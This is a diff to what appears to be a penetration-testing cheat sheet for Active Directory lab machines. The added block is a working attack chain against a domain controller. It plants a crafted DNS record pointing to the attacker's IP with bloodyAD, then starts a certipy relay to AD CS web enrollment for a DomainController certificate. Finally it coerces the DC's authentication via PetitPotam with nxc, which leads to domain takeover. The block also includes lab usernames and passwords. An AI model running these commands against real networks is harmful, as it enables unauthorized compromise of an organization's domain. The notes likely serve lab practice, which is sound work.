@@ -186,6 +186,20 @@ python3 printerbug.py INLANEFREIGHT.LOCAL/wwhite:"package5shores_topher1"@10.129
 ```
 
 ```bash
+# exploit via SMB
+# add the magic DNS entry
+# DNS record = [Target DC NetBIOS Name] + [Static Magic Blob]
+# Example: dc01 + 1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA
+bloodyAD -u Rosie.Powell -p Cicada123 -d cicada.vl -k --host DC-JPQ225.cicada.vl add dnsRecord <DC_NetBIOS>1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA <YOUR_IP>
+
+# listener
+certipy relay -target 'http://dc-jpq225.cicada.vl/' -template DomainController
+
+nxc smb DC-JPQ225.cicada.vl -u Rosie.Powell -p Cicada123 -k -M coerce_plus -o LISTENER=DC-JPQ2251UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA METHOD=PetitPotam
+
+```
+
+```bash
 # Two options
 # certipy
 certipy auth -pfx 'dc.pfx' -dc-ip '10.0.0.100'
